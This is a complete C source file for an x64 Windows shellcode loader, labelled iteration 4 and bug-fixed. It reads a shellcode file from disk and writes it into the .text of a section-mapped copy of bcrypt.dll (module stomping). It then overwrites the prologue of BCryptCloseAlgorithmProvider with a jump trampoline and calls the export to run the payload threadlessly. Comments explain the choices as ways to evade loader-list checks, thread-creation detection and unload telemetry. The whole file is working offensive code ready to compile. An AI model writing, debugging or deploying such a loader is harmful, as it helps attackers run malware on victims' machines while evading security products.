/*
 * x64 shellcode loader - Iteration 4 (bug-fixed)
 *
 * Root cause fixed vs Iteration 3:
 *   NtMapViewOfSection(SEC_IMAGE, Win32Protect=PAGE_EXECUTE_READWRITE) does
 *   NOT honor the requested protection: image sections inherit protection
 *   from the PE section headers (.text = PAGE_EXECUTE_READ).  The write
 *   into .text therefore faulted (0xC0000005) right after the "*.text at*"
 *   print.  Fix: explicitly VirtualProtect the .text range to RWX before
 *   writing, then restore to RX.  Also: clamp write to Misc.VirtualSize,
 *   FlushInstructionCache, read-back validation, VirtualQuery diagnostic.
 *
 * Technique composition (unchanged, threadless_injection preferred):
 *   - module_stomping_section_mapping: NtCreateSection(SEC_IMAGE) +
 *     NtMapViewOfSection of bcrypt.dll; payload written into the mapped
 *     .text (off the PEB loader list, file-backed image memory).
 *   - threadless_injection: 12-byte absolute-jump trampoline written over
 *     the prologue of the normally-loaded bcrypt.dll!
 *     BCryptCloseAlgorithmProvider; the export is then invoked normally
 *     from main().  No CreateThread, no APC, no callback API.
 *
 * Build (MSVC x64):
 *   cl /nologo /O2 /W3 /GS- loader_threadless_injection_4.c
 *
 * Usage:
 *   loader_threadless_injection_4.exe C:\path\to\calc.bin
 */

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winternl.h>   /* NTSTATUS, NTAPI, PHANDLE, ACCESS_MASK, PLARGE_INTEGER, PSIZE_T */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/* ------------------------------------------------------------------ */
/* Self-declared NT types / constants (winternl.h is incomplete).      */
/* ------------------------------------------------------------------ */

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000UL
#endif

/* winternl.h does NOT define SECTION_INHERIT; define it ourselves
 * BEFORE the typedef that references it. */
typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

/* ------------------------------------------------------------------ */
/* Self-declared NT prototypes (winternl.h does not prototype these).  */
/* ------------------------------------------------------------------ */

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    PVOID              ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID          *BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect
);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);

/* ------------------------------------------------------------------ */
/* One-shot guard.                                                     */
/* ------------------------------------------------------------------ */
static volatile LONG g_done = 0;

/* ------------------------------------------------------------------ */
/* Read the whole file into a heap buffer. Caller frees.               */
/* ------------------------------------------------------------------ */
static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;
    size_t got = 0;

    if (path == NULL || out_size == NULL) {
        return NULL;
    }

    fp = fopen(path, "rb");
    if (fp == NULL) {
        fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n", path, errno);
        fflush(stderr);
        return NULL;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        fclose(fp);
        return NULL;
    }
    sz = ftell(fp);
    if (sz <= 0) {
        fclose(fp);
        fprintf(stderr, "[-] empty or unreadable file\n");
        fflush(stderr);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) {
        fclose(fp);
        return NULL;
    }

    buf = (unsigned char *)malloc((size_t)sz);
    if (buf == NULL) {
        fclose(fp);
        return NULL;
    }

    got = fread(buf, 1, (size_t)sz, fp);
    fclose(fp);

    if (got != (size_t)sz) {
        fprintf(stderr, "[-] short read (%zu of %ld)\n", got, sz);
        fflush(stderr);
        free(buf);
        return NULL;
    }

    *out_size = (size_t)sz;
    return buf;
}

/* ------------------------------------------------------------------ */
/* Locate the executable section of an image-mapped view.              */
/* Returns the section base and its *VirtualSize* (not SizeOfRawData). */
/* ------------------------------------------------------------------ */
static unsigned char *find_exec_section(unsigned char *base, SIZE_T *out_size)
{
    PIMAGE_DOS_HEADER      dos;
    PIMAGE_NT_HEADERS      nt;
    PIMAGE_SECTION_HEADER  sec;
    WORD                   i;

    if (base == NULL || out_size == NULL) {
        return NULL;
    }

    dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            SIZE_T vs = (SIZE_T)sec[i].Misc.VirtualSize;
            if (vs == 0) {
                vs = (SIZE_T)sec[i].SizeOfRawData;
            }
            *out_size = vs;
            return base + sec[i].VirtualAddress;
        }
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Absolute-jump trampoline: mov rax, imm64 ; jmp rax  (12 bytes).     */
/* ------------------------------------------------------------------ */
#define TRAMPOLINE_LEN 12

static void build_jmp_trampoline(unsigned char *dst, void *target)
{
    dst[0] = 0x48;
    dst[1] = 0xB8;
    *(ULONGLONG *)(dst + 2) = (ULONGLONG)(ULONG_PTR)target;
    dst[10] = 0xFF;
    dst[11] = 0xE0;
}

/* ------------------------------------------------------------------ */
/* Resolve "<System32>\<name>". Returns 0 on success.                  */
/* ------------------------------------------------------------------ */
static int system32_path(const char *name, char *out, size_t out_cch)
{
    char sysdir[MAX_PATH];
    UINT n;
    int  written;

    if (name == NULL || out == NULL || out_cch < 2) {
        return -1;
    }

    n = GetSystemDirectoryA(sysdir, (UINT)(sizeof(sysdir) / sizeof(sysdir[0])));
    if (n == 0 || n >= (UINT)(sizeof(sysdir) / sizeof(sysdir[0]))) {
        return -1;
    }

    if ((size_t)n + 1 + strlen(name) + 1 > out_cch) {
        return -1;
    }

    if (n > 0 && sysdir[n - 1] == '\\') {
        sysdir[n - 1] = '\0';
    }

    written = _snprintf_s(out, out_cch, _TRUNCATE, "%s\\%s", sysdir, name);
    if (written < 0) {
        return -1;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* Prototype matching bcrypt.dll!BCryptCloseAlgorithmProvider.         */
/*   NTSTATUS NTAPI BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE,   */
/*                                               ULONG);               */
/* ------------------------------------------------------------------ */
typedef NTSTATUS (NTAPI *BCryptCloseAlgorithmProvider_t)(PVOID, ULONG);

/* ------------------------------------------------------------------ */
int main(int argc, char *argv[])
{
    unsigned char *sc = NULL;
    size_t         sc_size = 0;

    HMODULE        ntdll = NULL;
    pNtCreateSection    NtCreateSection    = NULL;
    pNtMapViewOfSection NtMapViewOfSection = NULL;
    pNtClose            NtClose            = NULL;

    HANDLE         hFile = INVALID_HANDLE_VALUE;
    HANDLE         hSection = NULL;
    PVOID          view = NULL;
    SIZE_T         viewSize = 0;
    NTSTATUS       st;

    unsigned char *exec = NULL;
    SIZE_T         exec_size = 0;
    SIZE_T         i;
    SIZE_T         write_len = 0;

    HMODULE        host = NULL;
    unsigned char *target_fn = NULL;
    unsigned char  saved_prologue[TRAMPOLINE_LEN];
    BOOL           prologue_saved = FALSE;

    char           host_path[MAX_PATH];
    const char    *host_dll_name = "bcrypt.dll";
    const char    *host_export   = "BCryptCloseAlgorithmProvider";

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        fflush(stderr);
        return 1;
    }

    /* ---- 1. Load payload bytes from disk ---- */
    sc = read_file(argv[1], &sc_size);
    if (sc == NULL) {
        return 1;
    }
    printf("[+] loaded %zu bytes from %s\n", sc_size, argv[1]);
    fflush(stdout);

    /* ---- 2. Resolve NT APIs from ntdll ---- */
    ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll == NULL) {
        fprintf(stderr, "[-] GetModuleHandleA(ntdll) failed: %lu\n", GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    NtCreateSection    = (pNtCreateSection)   (void *)GetProcAddress(ntdll, "NtCreateSection");
    NtMapViewOfSection = (pNtMapViewOfSection)(void *)GetProcAddress(ntdll, "NtMapViewOfSection");
    NtClose            = (pNtClose)           (void *)GetProcAddress(ntdll, "NtClose");

    if (NtCreateSection == NULL || NtMapViewOfSection == NULL || NtClose == NULL) {
        fprintf(stderr, "[-] failed to resolve NT APIs\n");
        fflush(stderr);
        goto cleanup;
    }

    /* ---- 3. Build System32 path for the sacrificial DLL ---- */
    if (system32_path(host_dll_name, host_path, sizeof(host_path)) != 0) {
        fprintf(stderr, "[-] failed to build System32 path for %s\n", host_dll_name);
        fflush(stderr);
        goto cleanup;
    }

    /* ---- 4. Open the sacrificial DLL (READ|EXECUTE required for SEC_IMAGE) ---- */
    hFile = CreateFileA(
        host_path,
        GENERIC_READ | GENERIC_EXECUTE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateFileA(%s) failed: %lu\n", host_path, GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    /* ---- 5. Create an image section from the DLL ---- */
    st = NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE | SECTION_QUERY,
        NULL,                       /* ObjectAttributes */
        NULL,                       /* MaximumSize */
        PAGE_EXECUTE_READ,          /* SectionPageProtection (ignored for SEC_IMAGE) */
        SEC_IMAGE,                  /* AllocationAttributes */
        hFile);

    if (!NT_SUCCESS(st) || hSection == NULL) {
        fprintf(stderr, "[-] NtCreateSection(SEC_IMAGE) failed: 0x%08lX\n",
                (unsigned long)st);
        fflush(stderr);
        goto cleanup;
    }

    /* ---- 6. Map a view of the image section into our process ---- *
     * NOTE: for SEC_IMAGE the Win32Protect argument is effectively    *
     * ignored -- the view inherits protection from the PE section     *
     * headers.  We therefore request the natural image protection and *
     * explicitly VirtualProtect the .text range below before writing. */
    viewSize = 0;
    st = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &view,
        0,                          /* ZeroBits */
        0,                          /* CommitSize */
        NULL,                       /* SectionOffset */
        &viewSize,
        ViewShare,
        0,
        PAGE_EXECUTE_READ);         /* natural image protection */

    if (!NT_SUCCESS(st) || view == NULL) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n",
                (unsigned long)st);
        fflush(stderr);
        goto cleanup;
    }

    printf("[+] mapped image view at %p (size %zu) from %s\n",
           view, (size_t)viewSize, host_path);
    fflush(stdout);

    /* ---- 7. Locate the executable section ---- */
    exec = find_exec_section((unsigned char *)view, &exec_size);
    if (exec == NULL || exec_size == 0) {
        fprintf(stderr, "[-] no executable section found in mapped image\n");
        fflush(stderr);
        goto cleanup;
    }

    if (sc_size > exec_size) {
        fprintf(stderr, "[-] payload (%zu) larger than .text (%zu)\n",
                sc_size, (size_t)exec_size);
        fflush(stderr);
        goto cleanup;
    }

    printf("[+] .text at %p (size %zu)\n", exec, (size_t)exec_size);
    fflush(stdout);

    /* ---- 8. Diagnostic: report the *actual* page protection ---- */
    {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T q = VirtualQuery(exec, &mbi, sizeof(mbi));
        if (q == sizeof(mbi)) {
            printf("[+] VirtualQuery(.text): Protect=0x%08lX State=0x%08lX Type=0x%08lX\n",
                   (unsigned long)mbi.Protect,
                   (unsigned long)mbi.State,
                   (unsigned long)mbi.Type);
        } else {
            printf("[!] VirtualQuery failed (%zu)\n", (size_t)q);
        }
        fflush(stdout);
    }

    /* ---- 9. Make .text writable, write payload, restore to RX ---- *
     * This is the fix for the Iteration 3 access violation: SEC_IMAGE *
     * views do NOT honor a map-time RWX request.                      */
    write_len = sc_size;
    if (write_len > exec_size) {
        write_len = exec_size;
    }

    {
        DWORD old_prot = 0;
        if (!VirtualProtect(exec, write_len, PAGE_EXECUTE_READWRITE, &old_prot)) {
            fprintf(stderr, "[-] VirtualProtect(RWX) on .text failed: %lu\n",
                    GetLastError());
            fflush(stderr);
            goto cleanup;
        }

        for (i = 0; i < write_len; ++i) {
            exec[i] = sc[i];
        }

        FlushInstructionCache(GetCurrentProcess(), exec, write_len);

        {
            DWORD tmp = 0;
            if (!VirtualProtect(exec, write_len, PAGE_EXECUTE_READ, &tmp)) {
                fprintf(stderr, "[!] VirtualProtect(RX restore) failed: %lu\n",
                        GetLastError());
                fflush(stderr);
                /* Non-fatal: continue, page is still executable. */
            }
        }
    }

    SecureZeroMemory(sc, sc_size);

    printf("[+] payload written into image-backed .text at %p (%zu bytes)\n",
           exec, (size_t)write_len);
    fflush(stdout);

    /* ---- 10. Load the host module by bare name (normal loader entry) ---- *
     * LoadLibraryA maps a *second* copy of bcrypt.dll (the normal loader  *
     * view).  We patch that loader copy's export prologue to jump into    *
     * the payload that lives in the SEC_IMAGE view mapped above.          */
    host = LoadLibraryA(host_dll_name);
    if (host == NULL) {
        fprintf(stderr, "[-] LoadLibraryA(%s) failed: %lu\n",
                host_dll_name, GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    target_fn = (unsigned char *)GetProcAddress(host, host_export);
    if (target_fn == NULL) {
        fprintf(stderr, "[-] GetProcAddress(%s!%s) failed: %lu\n",
                host_dll_name, host_export, GetLastError());
        fflush(stderr);
        goto cleanup;
    }

    printf("[+] target export %s!%s at %p\n", host_dll_name, host_export, target_fn);
    fflush(stdout);

    /* ---- 11. Patch the export prologue (12 bytes) with an absolute jmp ---- */
    {
        DWORD old_prot = 0;
        if (!VirtualProtect(target_fn, TRAMPOLINE_LEN, PAGE_EXECUTE_READWRITE, &old_prot)) {
            fprintf(stderr, "[-] VirtualProtect(RWX on export prologue) failed: %lu\n",
                    GetLastError());
            fflush(stderr);
            goto cleanup;
        }

        for (i = 0; i < TRAMPOLINE_LEN; ++i) {
            saved_prologue[i] = target_fn[i];
        }
        prologue_saved = TRUE;

        build_jmp_trampoline(target_fn, (void *)exec);

        FlushInstructionCache(GetCurrentProcess(), target_fn, TRAMPOLINE_LEN);

        {
            DWORD tmp_prot = 0;
            if (!VirtualProtect(target_fn, TRAMPOLINE_LEN, old_prot, &tmp_prot)) {
                fprintf(stderr, "[-] VirtualProtect(restore on export) failed: %lu\n",
                        GetLastError());
                fflush(stderr);
                goto cleanup;
            }
        }
    }

    /* ---- 12. Read-back validation of the trampoline ---- */
    {
        ULONGLONG back = 0;
        if (target_fn[0] != 0x48 || target_fn[1] != 0xB8 ||
            target_fn[10] != 0xFF || target_fn[11] != 0xE0) {
            fprintf(stderr, "[-] trampoline read-back mismatch (bytes)\n");
            fflush(stderr);
            goto cleanup;
        }
        back = *(ULONGLONG *)(target_fn + 2);
        if ((ULONGLONG)(ULONG_PTR)exec != back) {
            fprintf(stderr, "[-] trampoline target mismatch: 0x%llX vs 0x%llX\n",
                    (unsigned long long)back,
                    (unsigned long long)(ULONG_PTR)exec);
            fflush(stderr);
            goto cleanup;
        }
    }

    printf("[+] patched %s!%s prologue -> jmp payload (validated)\n",
           host_dll_name, host_export);
    fflush(stdout);

    /* ---- 13. Trigger: call the patched export normally ---- *
     * BCryptCloseAlgorithmProvider has the safe 2-argument    *
     * NTAPI prototype (HANDLE, ULONG), matching our typedef.  */
    printf("[+] dispatching payload via patched %s!%s (threadless)\n",
           host_dll_name, host_export);
    fflush(stdout);

    {
        BCryptCloseAlgorithmProvider_t call_export =
            (BCryptCloseAlgorithmProvider_t)target_fn;

        if (InterlockedCompareExchange(&g_done, 1, 0) == 0) {
            /* Trampoline in the export prologue jumps to the payload. */
            call_export(NULL, 0);
        }
    }

    printf("[+] payload returned; cleaning up\n");
    fflush(stdout);

cleanup:
    /* Restore the patched prologue before exit. */
    if (prologue_saved && target_fn != NULL) {
        DWORD cur_prot = 0;
        if (VirtualProtect(target_fn, TRAMPOLINE_LEN, PAGE_EXECUTE_READWRITE, &cur_prot)) {
            SIZE_T j;
            for (j = 0; j < TRAMPOLINE_LEN; ++j) {
                target_fn[j] = saved_prologue[j];
            }
            FlushInstructionCache(GetCurrentProcess(), target_fn, TRAMPOLINE_LEN);
            {
                DWORD tmp = 0;
                VirtualProtect(target_fn, TRAMPOLINE_LEN, cur_prot, &tmp);
            }
        }
    }

    if (sc != NULL) {
        SecureZeroMemory(sc, sc_size);
        free(sc);
        sc = NULL;
    }
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
    }
    if (hSection != NULL) {
        NtClose(hSection);
        hSection = NULL;
    }
    /*
     * Deliberately do NOT unmap the view and do NOT FreeLibrary(host):
     * the stomped image and the loaded bcrypt.dll remain mapped in our
     * process, matching the appearance of a normally loaded module and
     * avoiding any unmap/unload telemetry.
     */
    return 0;
}